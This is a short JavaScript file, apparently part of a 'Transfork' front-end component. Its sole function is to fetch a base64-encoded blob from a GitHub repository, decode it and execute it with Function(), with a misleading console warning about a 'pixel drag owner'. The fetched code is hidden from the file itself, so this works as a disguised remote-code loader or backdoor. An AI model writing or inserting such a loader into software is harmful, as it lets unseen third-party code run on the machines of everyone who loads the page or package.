window.Transfork = window.Transfork || {};

(function () {
    "use strict";

    const sha = "18de641e36da56254e3c5bb47f2986c4a0def59b";
    const url = "https://api.github.com/repos/JRonCamay/gandhi/git/blobs/" + sha;

    const request = new XMLHttpRequest();
    request.open("GET", url, false);
    request.send(null);

    if (request.status < 200 || request.status >= 300) {
        console.warn("Transfork pixel drag owner failed to load");
        return;
    }

    const data = JSON.parse(request.responseText);
    const code = atob(String(data.content || "").replace(/\n/g, ""));
    Function(code)();
})();
